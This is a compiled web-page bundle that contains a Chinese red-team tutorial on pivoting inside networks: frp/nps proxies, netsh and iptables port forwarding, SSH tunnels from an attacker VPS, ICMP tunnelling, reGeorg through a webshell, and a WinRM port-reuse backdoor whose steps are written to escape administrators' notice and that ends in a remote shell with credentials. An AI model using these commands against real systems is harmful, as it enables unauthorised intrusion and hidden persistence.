(window.webpackJsonp=window.webpackJsonp||[]).push([[34],{761:function(s,t,a){"use strict";a.r(t);var e=a(103),n=Object(e.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"边界代理"}},[s._v("边界代理 "),a("a",{staticClass:"header-anchor",attrs:{href:"#边界代理"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("遵循三个原则")])]),s._v(" "),a("ol",[a("li",[a("p",[a("strong",[s._v("稳定性")]),s._v("（主要用于扫描）{ 支持高并发、自动断线重连 }")])]),s._v(" "),a("li",[a("p",[a("strong",[s._v("安全性")]),s._v("（防止socks5直接被ban）{ 流量可加密、开放代理可设置认证 }")])]),s._v(" "),a("li",[a("p",[a("strong",[s._v("健壮性")]),s._v("   { 支持多种协议方式、最好支持插件定制 }")])])]),s._v(" "),a("p",[a("strong",[s._v("推荐工具")])]),s._v(" "),a("table",[a("thead",[a("tr",[a("th",[s._v("工具")]),s._v(" "),a("th",[s._v("优点")]),s._v(" "),a("th",[s._v("缺点")])])]),s._v(" "),a("tbody",[a("tr",[a("td",[a("strong",[a("a",{attrs:{href:"https://github.com/fatedier/frp",target:"_blank",rel:"noopener noreferrer"}},[s._v("Frp"),a("OutboundLink")],1)])]),s._v(" "),a("td",[s._v("稳定、支持断线重连（大流量不断线）"),a("br"),s._v("支持将代理端口放在本地（跳板机只开个frp服务端口）")]),s._v(" "),a("td",[s._v("配置复杂，体积偏大")])]),s._v(" "),a("tr",[a("td",[a("strong",[a("a",{attrs:{href:"https://github.com/ehang-io/nps",target:"_blank",rel:"noopener noreferrer"}},[s._v("Nps"),a("OutboundLink")],1)])]),s._v(" "),a("td",[s._v("自带Web管理，一键启动"),a("br"),a("strong",[s._v("多级代理友好")])]),s._v(" "),a("td",[s._v("稳定性不如Frp"),a("br"),s._v("会在tmp生成文件")])])])]),s._v(" "),a("h1",{attrs:{id:"端口转发-打17-010等漏洞"}},[s._v("端口转发（打17_010等漏洞） "),a("a",{staticClass:"header-anchor",attrs:{href:"#端口转发-打17-010等漏洞"}},[s._v("#")])]),s._v(" "),a("h2",{attrs:{id:"windows-netsh"}},[s._v("Windows netsh "),a("a",{staticClass:"header-anchor",attrs:{href:"#windows-netsh"}},[s._v("#")])]),s._v(" "),a("p",[a("code",[s._v("netsh")]),s._v("仅支持TCP协议， 适用于"),a("strong",[s._v("双网卡")]),s._v("服务器， 连接外网6666端口，就是连接到内网目标上面的3389。")]),s._v(" "),a("p",[a("strong",[s._v("启动转发")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看现有规则")]),s._v("\nnetsh interface portproxy show all\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#添加转发规则")]),s._v("\nnetsh interface portproxy "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" v4tov4 "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("listenaddress")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("外网IP "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("listenport")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6666")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("connectaddress")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("内网IP "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("connectport")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3389")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[a("strong",[s._v("取消转发")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#删除转发规则")]),s._v("\nnetsh interface portproxy delete v4tov4 "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("listenport")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6666")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#xp需要安装ipv6")]),s._v("\nnetsh interface ipv6 "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("install")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("h2",{attrs:{id:"linux-ssh隧道-高权限用"}},[s._v("Linux SSH隧道（高权限用） "),a("a",{staticClass:"header-anchor",attrs:{href:"#linux-ssh隧道-高权限用"}},[s._v("#")])]),s._v(" "),a("p",[s._v("SSH一般是允许通过防火墙的，而且传输过程是加密的")]),s._v(" "),a("blockquote",[a("p",[s._v("测试环境如下图，VPS可访问Web服务器，但不能访问内网其它机器，Web服务器可访问内网其它机器。")]),s._v(" "),a("p",[s._v("目标：以Web服务器为跳板访问内网其它机器。")])]),s._v(" "),a("p",[a("img",{attrs:{src:"/images/image-20200619231457834.png",alt:""}})]),s._v(" "),a("p",[a("strong",[s._v("本地转发")])]),s._v(" "),a("p",[s._v("在"),a("code",[s._v("VPS（黑客）")]),s._v("上执行以下命令")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" -CfNg -L "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1153")]),s._v("（VPS端口）:10.1.1.3（目标主机）:3389（目标端口）\nroot@192.168.0.3（跳板机，Web服务器，会要求输入密码）\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看1153端口是否已经连接")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("netstat")]),s._v(" -tulnp "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("grep")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"1153"')]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#连接目标数据库服务器的远程桌面")]),s._v("\nrdesktop "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1:1153\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("p",[s._v("SSH进程的本地端口映射，将本地端口转发到远端指定机器的指定端口；")]),s._v(" "),a("p",[s._v("本地端口转发是在本地监听一个端口，所有访问这个端口的流量都会通过SSH隧道传输到远端的对应端口。")]),s._v(" "),a("p",[a("strong",[s._v("远程转发")])]),s._v(" "),a("p",[s._v("在"),a("code",[s._v("Web服务器")]),s._v("上执行如下命令")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" -CfNg -R "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1122")]),s._v("（VPS端口）:10.1.1.3（目标主机，数据库）:3389（目标端口） root@192.168.0.5"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("VPS的IP"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("访问"),a("code",[s._v("VPS")]),s._v("的1122端口，即可连接内网数据库服务器的3389")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("rdesktop "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("127.0")]),s._v(".0.1:1122\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("所有访问"),a("code",[s._v("VPS")]),s._v("的1122端口的流量都会通过SSH隧道传输到数据库服务器的3389端口")]),s._v(" "),a("h2",{attrs:{id:"icmp隧道"}},[s._v("ICMP隧道 "),a("a",{staticClass:"header-anchor",attrs:{href:"#icmp隧道"}},[s._v("#")])]),s._v(" "),a("p",[s._v("项目地址：https://github.com/esrrhs/pingtunnel")]),s._v(" "),a("p",[s._v("适用场景 ：特殊环境下icmp流量允许出网")]),s._v(" "),a("p",[s._v("实现原理：客户端将TCP流量封装成icmp，然后发送给服务端，服务端再从ICMP包解析出正常TCP流量最后发向目标")]),s._v(" "),a("p",[a("img",{attrs:{src:"/images/image-20200613145026593.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"iptables正向端口转发"}},[s._v("iptables正向端口转发 "),a("a",{staticClass:"header-anchor",attrs:{href:"#iptables正向端口转发"}},[s._v("#")])]),s._v(" "),a("p",[s._v("1、编辑配置文件")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("vi")]),s._v(" /etc/sysctl.conf\n\tnet.ipv4.ip_forward "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#开启IP转发")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("2、关闭服务")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("service")]),s._v(" iptables stop\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("3、配置规则")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#需要访问的内网地址：10.1.1.11（Windows）")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#内网边界web服务器：192.168.100.100（Linux）")]),s._v("\niptables -t nat -A PREROUTING --dst "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".100.100 -p tcp --dport "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3389")]),s._v(" -j DNAT--to-destination "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.1")]),s._v(".1.11:3389\n\niptables -t nat -A POSTROUTING --dst "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.1")]),s._v(".1.11 -p tcp --dport "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3389")]),s._v(" -j SNAT --to-source "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".100.100\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[s._v("4、保存并重启服务")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("service")]),s._v(" iptables save "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("service")]),s._v(" iptables start\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("这时访问Web服务器的3389就能登录到内网机器的桌面了。")]),s._v(" "),a("h1",{attrs:{id:"端口复用"}},[s._v("端口复用 "),a("a",{staticClass:"header-anchor",attrs:{href:"#端口复用"}},[s._v("#")])]),s._v(" "),a("blockquote",[a("p",[a("strong",[s._v("适用场景")])]),s._v(" "),a("p",[s._v("需要占用一些已经开启的端口情况下（  server只对外开放指定端口，无法向外进行端口转发  、规避防火墙）")]),s._v(" "),a("p",[s._v("当前机器不出网不出网情况下，留正向后门")])]),s._v(" "),a("h2",{attrs:{id:"regeorg-端口复用"}},[s._v("reGeorg 端口复用 "),a("a",{staticClass:"header-anchor",attrs:{href:"#regeorg-端口复用"}},[s._v("#")])]),s._v(" "),a("blockquote",[a("p",[s._v("网络情况：A只能连接B主机的80端口，A无法与C进行通信，且B无法与外网进行通信")])]),s._v(" "),a("p",[s._v("项目地址： https://github.com/sensepost/reGeorg")]),s._v(" "),a("p",[s._v("reGeorg是一个Python2.7环境下开发的一款结合Webshell进行端口复用的工具；")]),s._v(" "),a("p",[s._v("能够将数据通过在本地建立的Socks服务转发到内网环境 ；")]),s._v(" "),a("p",[s._v("reGeorg需要配合Webshell使用，并且需要一个良好的网络状况，Python环境必须安装"),a("code",[s._v("Urlib3")])]),s._v(" "),a("p",[a("strong",[s._v("创建Socks5代理")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("python2 reGeorgSocksProxy.py -p "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("本地Socks5服务监听的端口"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" -u "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("Webshell地址"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\npython2 reGeorgSocksProxy.py -p "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("8888")]),s._v(" -u http://xxx.com/shell.jsp\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("之后使用浏览器设置Socks代理，就能访问内网主机的端口了，或者结合 Proxifier 连接 3389")]),s._v(" "),a("h2",{attrs:{id:"http-sys端口复用后门"}},[s._v("HTTP.sys端口复用后门 "),a("a",{staticClass:"header-anchor",attrs:{href:"#http-sys端口复用后门"}},[s._v("#")])]),s._v(" "),a("blockquote",[a("p",[s._v("HTTP.sys驱动是IIS的主要组成部分，主要负责HTTP协议相关的处理，它有一个重要的功能叫"),a("strong",[s._v("Port Sharing")]),s._v("，即端口共享；")]),s._v(" "),a("p",[s._v("所有基于HTTP.sys驱动的HTTP应用可以共享同一个端口，只需要各自注册的url前缀不一样即可；")]),s._v(" "),a("p",[s._v("使用Windows的远程管理服务WinRM，结合HTTP.sys驱动自带的端口复用功能，可实现端口复用后门")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("netsh http show servicestate\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看所有在HTTP.sys上注册过的url前缀")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("1、 开启WinRM服务")])]),s._v(" "),a("p",[s._v("WinRm使用端口："),a("code",[s._v("http 5985、https 5986")])]),s._v(" "),a("p",[a("code",[s._v("Server 2012")]),s._v("及之后，已经默认开启WinRM并监听了"),a("code",[s._v("5985")]),s._v("端口")]),s._v(" "),a("p",[a("code",[s._v("Server 2008")]),s._v("及之前的系统")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("winrm quickconfig -q\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#开启WinRM并自动从防火墙放行`5985`端口")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("2、 Server 2012配置，新增80端口Listerner")])]),s._v(" "),a("p",[s._v("对于原本就开放了WinRM的机器（Server 2012），需要保留该端口，以免影响系统管理员正常使用")]),s._v(" "),a("p",[s._v("同时还需要新增一个80端口的Listener供攻击者使用")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("winrm "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" winrm/config/service @"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("EnableCompatibilityHttpListener"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"true"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n\nwinrm e winrm/config/Listener\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看80端口的Listener是否出现")]),s._v("\nnetsh http show servicestate\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看是否新增了url前缀")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[a("strong",[s._v("3、Server 2008配置，修改WinRM端口")])]),s._v(" "),a("p",[s._v("对于原本未开放WinRM服务的机器（Server 2008），需要把新开的"),a("strong",[s._v("5985")]),s._v("端口修改至80端口，避免引起系统管理员怀疑")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("winrm "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" winrm/config/Listener?Address"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("*+Transport"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("HTTP @"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("Port"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"80"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("4、后门连接")])]),s._v(" "),a("p",[s._v("首先开启本机WinRM服务，然后设置信任连接的主机")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("winrm quickconfig -q \t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 开启服务")]),s._v("\nwinrm "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" winrm/config/Client @"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("TrustedHosts"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"*"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 设置信任连接的主机")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("执行使用winrs命令连接远程WinRM服务，获取交互shell")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("winrs -r:http://www.baidu.com -u:administrator -p:P@ssw0rd cmd\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("hr"),s._v(" "),a("p",[s._v("端口复用相关工具： https://github.com/Heart-Sky/port-multiplexing")]),s._v(" "),a("h1",{attrs:{id:"参考连接"}},[s._v("参考连接 "),a("a",{staticClass:"header-anchor",attrs:{href:"#参考连接"}},[s._v("#")])]),s._v(" "),a("p",[a("a",{attrs:{href:"https://www.cnblogs.com/0x4D75/p/11381449.html#%E4%B8%80-%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8",target:"_blank",rel:"noopener noreferrer"}},[s._v("端口复用后门 - 0x4D75 - 博客园"),a("OutboundLink")],1)])])}),[],!1,null,null,null);t.default=n.exports}}]);